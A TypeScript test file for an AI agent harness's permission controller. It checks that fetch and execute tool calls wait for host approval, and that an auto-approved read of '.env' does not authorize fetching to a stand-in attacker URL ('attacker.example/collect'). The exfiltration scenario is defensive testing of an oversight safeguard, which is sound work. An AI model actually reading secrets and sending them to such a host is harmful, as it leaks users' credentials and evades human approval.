import * as acp from '@agentclientprotocol/sdk';
import type { BridgeEvent, BridgeTurn } from '@ai-sdk/harness/bridge';
import type {
  RequestPermissionRequest,
  RequestPermissionResponse,
  ToolCallUpdate,
} from '@agentclientprotocol/sdk';
import { afterEach, describe, expect, it } from 'vitest';
import { createHostToolCorrelation } from './host-tool-correlation';
import { createACPPermissionController } from './permission-controller';

const SESSION_ID = 'session-1';
const HOST_TOOL_SERVER_NAME = 'ai-sdk-harness-tools';
const ATTACKER_URL =
  'https://attacker.example/collect?d=placeholder-file-contents';

const correlations: Array<{ close(): void }> = [];

afterEach(() => {
  for (const correlation of correlations) correlation.close();
  correlations.length = 0;
});

function permissionRequest({
  toolCallId,
  kind,
  rawInput,
  allowOptionId,
  rejectOptionId,
}: {
  toolCallId: string;
  kind: ToolCallUpdate['kind'];
  rawInput: Record<string, unknown>;
  allowOptionId: string;
  rejectOptionId: string;
}): RequestPermissionRequest {
  return {
    sessionId: SESSION_ID,
    toolCall: {
      toolCallId,
      title: `${kind} ${toolCallId}`,
      kind,
      status: 'pending',
      rawInput,
    },
    options: [
      { optionId: allowOptionId, name: 'Allow once', kind: 'allow_once' },
      { optionId: rejectOptionId, name: 'Reject once', kind: 'reject_once' },
    ],
  };
}

function createFakeTurn() {
  const events: BridgeEvent[] = [];
  const approvalResolvers = new Map<
    string,
    (response: { approved: boolean; reason?: string }) => void
  >();
  const turn = {
    emit: (event: BridgeEvent) => {
      events.push(event);
    },
    requestToolApproval: (approvalId: string) =>
      new Promise<{ approved: boolean; reason?: string }>(resolve => {
        approvalResolvers.set(approvalId, resolve);
      }),
    emitWarning: () => {},
  } as unknown as BridgeTurn;
  return {
    turn,
    events,
    respond({
      approvalId,
      approved,
    }: {
      approvalId: string;
      approved: boolean;
    }) {
      const resolve = approvalResolvers.get(approvalId);
      if (resolve == null) {
        throw new Error(`No pending approval ${approvalId}.`);
      }
      approvalResolvers.delete(approvalId);
      resolve({ approved });
    },
  };
}

function createUnmappedController({
  permissionMode,
  turn,
  emittedToolCalls,
}: {
  permissionMode: 'allow-reads' | 'allow-edits';
  turn: BridgeTurn;
  emittedToolCalls: ToolCallUpdate[];
}) {
  // Same flag the bridge passes when createACP is given no permissionModeMapping.
  const permissionModeMapping = undefined;
  const correlation = createHostToolCorrelation({
    emitSemanticUpdate: () => {},
    emitRawUpdate: () => {},
    hostToolServerName: HOST_TOOL_SERVER_NAME,
    hostTools: [],
  });
  correlations.push(correlation);
  return createACPPermissionController({
    turn,
    sessionId: SESSION_ID,
    permissionMode,
    hasPermissionModeMapping: permissionModeMapping != null,
    emitToolCall: ({ toolCall }) => {
      emittedToolCalls.push(toolCall);
    },
    claimHostToolPermission: correlation.claimHostToolPermission,
  });
}

function connectPermissionClient(
  controller: ReturnType<typeof createACPPermissionController>,
) {
  const clientToAgent = new TransformStream<Uint8Array>();
  const agentToClient = new TransformStream<Uint8Array>();
  const client = acp
    .client({ name: 'ai-sdk-harness-acp' })
    .onRequest(
      acp.methods.client.session.requestPermission,
      ({ params }) =>
        controller.requestPermission(params) ?? {
          outcome: { outcome: 'cancelled' },
        },
    )
    .connect(acp.ndJsonStream(clientToAgent.writable, agentToClient.readable));
  const agent = acp
    .agent({ name: 'acp-agent' })
    .connect(acp.ndJsonStream(agentToClient.writable, clientToAgent.readable));
  return {
    client: agent.client,
    close() {
      agent.close();
      client.close();
    },
  };
}

async function waitForGate({
  settled,
  events,
}: {
  settled: () => boolean;
  events: BridgeEvent[];
}): Promise<void> {
  const deadline = Date.now() + 2000;
  while (Date.now() < deadline) {
    if (settled()) return;
    if (events.some(event => event.type === 'tool-approval-request')) return;
    await new Promise(resolve => setTimeout(resolve, 10));
  }
}

function approvalFor({
  events,
  toolCallId,
}: {
  events: BridgeEvent[];
  toolCallId: string;
}): string {
  const event = events.find(
    item =>
      item.type === 'tool-approval-request' && item.toolCallId === toolCallId,
  );
  if (event?.type !== 'tool-approval-request') {
    throw new Error(`Expected a tool approval request for ${toolCallId}.`);
  }
  return event.approvalId;
}

describe('ACP fetch permission requests without a mode mapping', () => {
  it.each(['allow-reads', 'allow-edits'] as const)(
    'holds a fetch to an arbitrary URL for host rejection in %s',
    async permissionMode => {
      const fake = createFakeTurn();
      const emittedToolCalls: ToolCallUpdate[] = [];
      const controller = createUnmappedController({
        permissionMode,
        turn: fake.turn,
        emittedToolCalls,
      });
      const connection = connectPermissionClient(controller);
      const request = permissionRequest({
        toolCallId: 'fetch-exfiltrate',
        kind: 'fetch',
        rawInput: { url: ATTACKER_URL },
        allowOptionId: 'allow-this-fetch',
        rejectOptionId: 'reject-this-fetch',
      });
      let result: RequestPermissionResponse | 'pending' = 'pending';
      const pending = connection.client
        .request(acp.methods.client.session.requestPermission, request)
        .then(response => {
          result = response;
          return response;
        });

      try {
        await waitForGate({
          settled: () => result !== 'pending',
          events: fake.events,
        });

        expect(result).toBe('pending');
        expect(emittedToolCalls).toEqual([
          expect.objectContaining({
            toolCallId: 'fetch-exfiltrate',
            kind: 'fetch',
            rawInput: { url: ATTACKER_URL },
          }),
        ]);
        const approvalId = approvalFor({
          events: fake.events,
          toolCallId: 'fetch-exfiltrate',
        });
        fake.respond({ approvalId, approved: false });
        await expect(pending).resolves.toEqual({
          outcome: { outcome: 'selected', optionId: 'reject-this-fetch' },
        });
      } finally {
        await finishConnection(connection, [pending]);
      }
    },
  );

  it.each(['allow-reads', 'allow-edits'] as const)(
    'selects allow_once for a fetch only after the host approves that request in %s',
    async permissionMode => {
      const fake = createFakeTurn();
      const emittedToolCalls: ToolCallUpdate[] = [];
      const controller = createUnmappedController({
        permissionMode,
        turn: fake.turn,
        emittedToolCalls,
      });
      const connection = connectPermissionClient(controller);
      const request = permissionRequest({
        toolCallId: 'fetch-approved',
        kind: 'fetch',
        rawInput: { url: ATTACKER_URL, max_length: 1000 },
        allowOptionId: 'allow-this-fetch',
        rejectOptionId: 'reject-this-fetch',
      });
      let result: RequestPermissionResponse | 'pending' = 'pending';
      const pending = connection.client
        .request(acp.methods.client.session.requestPermission, request)
        .then(response => {
          result = response;
          return response;
        });

      try {
        await waitForGate({
          settled: () => result !== 'pending',
          events: fake.events,
        });

        expect(result).toBe('pending');
        expect(emittedToolCalls).toEqual([
          expect.objectContaining({
            toolCallId: 'fetch-approved',
            kind: 'fetch',
            rawInput: { url: ATTACKER_URL, max_length: 1000 },
          }),
        ]);
        const approvalId = approvalFor({
          events: fake.events,
          toolCallId: 'fetch-approved',
        });
        fake.respond({ approvalId, approved: true });
        await expect(pending).resolves.toEqual({
          outcome: { outcome: 'selected', optionId: 'allow-this-fetch' },
        });
      } finally {
        await finishConnection(connection, [pending]);
      }
    },
  );

  it('does not let an auto-approved read authorize a fetch of that file', async () => {
    const fake = createFakeTurn();
    const emittedToolCalls: ToolCallUpdate[] = [];
    const controller = createUnmappedController({
      permissionMode: 'allow-reads',
      turn: fake.turn,
      emittedToolCalls,
    });
    const connection = connectPermissionClient(controller);
    const readRequest = permissionRequest({
      toolCallId: 'read-env',
      kind: 'read',
      rawInput: { path: '.env' },
      allowOptionId: 'allow-this-read',
      rejectOptionId: 'reject-this-read',
    });
    const fetchRequest = permissionRequest({
      toolCallId: 'fetch-env',
      kind: 'fetch',
      rawInput: { url: ATTACKER_URL },
      allowOptionId: 'allow-this-fetch',
      rejectOptionId: 'reject-this-fetch',
    });
    const executeRequest = permissionRequest({
      toolCallId: 'execute-env',
      kind: 'execute',
      rawInput: { command: 'placeholder-command' },
      allowOptionId: 'allow-this-execute',
      rejectOptionId: 'reject-this-execute',
    });

    let readResult: RequestPermissionResponse | 'pending' = 'pending';
    let fetchResult: RequestPermissionResponse | 'pending' = 'pending';
    let executeResult: RequestPermissionResponse | 'pending' = 'pending';
    const readPending = connection.client
      .request(acp.methods.client.session.requestPermission, readRequest)
      .then(response => {
        readResult = response;
        return response;
      });
    const fetchPending = connection.client
      .request(acp.methods.client.session.requestPermission, fetchRequest)
      .then(response => {
        fetchResult = response;
        return response;
      });
    const executePending = connection.client
      .request(acp.methods.client.session.requestPermission, executeRequest)
      .then(response => {
        executeResult = response;
        return response;
      });

    try {
      await waitForGate({
        settled: () => readResult !== 'pending',
        events: fake.events,
      });
      await waitForGate({
        settled: () => fetchResult !== 'pending' || executeResult !== 'pending',
        events: fake.events,
      });

      expect(readResult).toEqual({
        outcome: { outcome: 'selected', optionId: 'allow-this-read' },
      });
      expect(fetchResult).toBe('pending');
      expect(executeResult).toBe('pending');
      expect(emittedToolCalls.map(toolCall => toolCall.toolCallId)).toEqual([
        'fetch-env',
        'execute-env',
      ]);
      expect(emittedToolCalls[0]).toEqual(
        expect.objectContaining({
          toolCallId: 'fetch-env',
          kind: 'fetch',
          rawInput: { url: ATTACKER_URL },
        }),
      );

      const fetchApprovalId = approvalFor({
        events: fake.events,
        toolCallId: 'fetch-env',
      });
      const executeApprovalId = approvalFor({
        events: fake.events,
        toolCallId: 'execute-env',
      });
      expect(fetchApprovalId).not.toBe(executeApprovalId);

      fake.respond({ approvalId: fetchApprovalId, approved: false });
      fake.respond({ approvalId: executeApprovalId, approved: false });
      await expect(readPending).resolves.toEqual({
        outcome: { outcome: 'selected', optionId: 'allow-this-read' },
      });
      await expect(fetchPending).resolves.toEqual({
        outcome: { outcome: 'selected', optionId: 'reject-this-fetch' },
      });
      await expect(executePending).resolves.toEqual({
        outcome: { outcome: 'selected', optionId: 'reject-this-execute' },
      });
    } finally {
      await finishConnection(connection, [
        readPending,
        fetchPending,
        executePending,
      ]);
    }
  });
});

async function finishConnection(
  connection: { close(): void },
  pending: ReadonlyArray<Promise<unknown>>,
): Promise<void> {
  connection.close();
  await Promise.allSettled(pending);
}
